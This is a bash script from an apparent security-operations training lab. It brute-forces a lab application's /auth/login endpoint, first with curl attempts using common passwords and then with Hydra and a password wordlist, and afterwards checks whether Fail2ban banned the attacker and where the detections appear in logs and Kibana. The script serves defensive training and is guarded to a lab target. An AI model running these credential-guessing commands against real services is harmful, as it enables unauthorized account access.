#!/bin/bash
# SOC-Lab Attack Script: S2 - API Brute Force
# Purpose: Demonstrate authentication attack detection and Fail2ban

set -e

# Resolve the repository copy when run from source and the read-only mounted
# copy when run in the attack container. No external command runs before the
# target profile is validated.
ATTACK_SCRIPT_PATH="${BASH_SOURCE[0]}"
ATTACK_SCRIPT_DIR="${ATTACK_SCRIPT_PATH%/*}"
if [[ "$ATTACK_SCRIPT_DIR" == "$ATTACK_SCRIPT_PATH" ]]; then
    ATTACK_SCRIPT_DIR=.
fi
if [[ -r "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh" ]]; then
    source "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh"
elif [[ "$ATTACK_SCRIPT_DIR" == "/scripts" && -r "/secure-learn-target-guard.sh" ]]; then
    source "/secure-learn-target-guard.sh"
else
    echo "ERROR: Secure Learn target guard is unavailable." >&2
    exit 64
fi
secure_learn_validate_target

# Configuration
TARGET="${TARGET:-app}"
TARGET_IP="${TARGET_IP:-172.23.0.20}"
TARGET_PORT="${TARGET_PORT:-3000}"
WORDLIST="${WORDLIST:-/wordlists/passwords.txt}"
USERNAME="${USERNAME:-admin}"
OUTPUT_DIR="/results"

echo "============================================"
echo "SOC-Lab Scenario S2: API Brute Force"
echo "============================================"
echo ""
echo "Target: http://$TARGET:$TARGET_PORT/auth/login"
echo "Username: $USERNAME"
echo "Wordlist: $WORDLIST"
echo "Time: $(date -Iseconds)"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Check if target is reachable
echo "Checking target connectivity..."
if ! curl -s --connect-timeout 5 -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" > /dev/null 2>&1; then
    echo "ERROR: Target is not reachable at http://$TARGET:$TARGET_PORT"
    exit 1
fi
echo "Target is reachable."
echo ""

# Output file
OUTPUT_FILE="$OUTPUT_DIR/s2_bruteforce_$(date +%Y%m%d_%H%M%S).txt"

echo "============================================"
echo "Phase 1: Manual Login Attempts"
echo "============================================"

# Demonstrate a few manual attempts first
for password in "password" "admin" "123456" "wrong"; do
    echo "Trying: $USERNAME / $password"
    response=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/auth/login" \
        -H "Host: $TARGET" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$USERNAME\",\"password\":\"$password\"}" \
        -w "\nHTTP_CODE:%{http_code}")
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    echo "  Response: HTTP $http_code"
    
    if [ "$http_code" = "200" ]; then
        echo "  SUCCESS: Valid credentials found!"
    fi
    sleep 0.5
done

echo ""
echo "============================================"
echo "Phase 2: Hydra Brute Force Attack"
echo "============================================"

# Run Hydra attack
echo "Running Hydra..."
hydra_status=0
hydra -l "$USERNAME" \
    -P "$WORDLIST" \
    -s "$TARGET_PORT" \
    -f \
    -V \
    "$TARGET_IP" \
    http-post-form "/auth/login:username=^USER^&password=^PASS^:Invalid" \
    > "$OUTPUT_FILE" 2>&1 || hydra_status=$?

# A remediated target normally makes Hydra exit without finding credentials.
# Preserve that expected status as evidence instead of silently discarding it.
echo "Hydra exit status: $hydra_status" >> "$OUTPUT_FILE"

# Show results
echo ""
echo "Hydra output (last 20 lines):"
tail -20 "$OUTPUT_FILE"

echo ""
echo "============================================"
echo "Phase 3: Check Detection Status"
echo "============================================"

# Wait a moment for logs to propagate
sleep 2

# Check if we're banned
echo "Checking if attack IP is banned..."
banned_check=$(curl -s --connect-timeout 5 -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/auth/login" 2>&1 || echo "CONNECTION_REFUSED")

if echo "$banned_check" | grep -q "CONNECTION_REFUSED\|timeout\|Connection refused"; then
    echo "  [PASS] Connection refused after repeated attempts"
else
    echo "  [!] NOT BANNED: Still able to connect"
fi

echo ""
echo "============================================"
echo "Attack Complete"
echo "============================================"
echo ""
echo "Check the following for detection:"
echo ""
echo "1. Application auth logs:"
echo "   docker exec soc-lab-app cat /var/log/app/auth.log | tail -20"
echo ""
echo "2. Fail2ban status:"
echo "   docker exec soc-lab-fail2ban fail2ban-client status nestjs-auth"
echo ""
echo "3. Kibana:"
echo "   - Search: event.action:login_failed"
echo "   - Search: event.module:fail2ban AND event.action:ban"
echo ""
echo "Verification still required:"
echo "  [ ] auth.log shows login_failed events"
echo "  [ ] Suricata records authentication attack telemetry"
echo "  [ ] Events are indexed in Elasticsearch"
echo "Run on the host: scripts/scenario_e2e_check.sh S2"
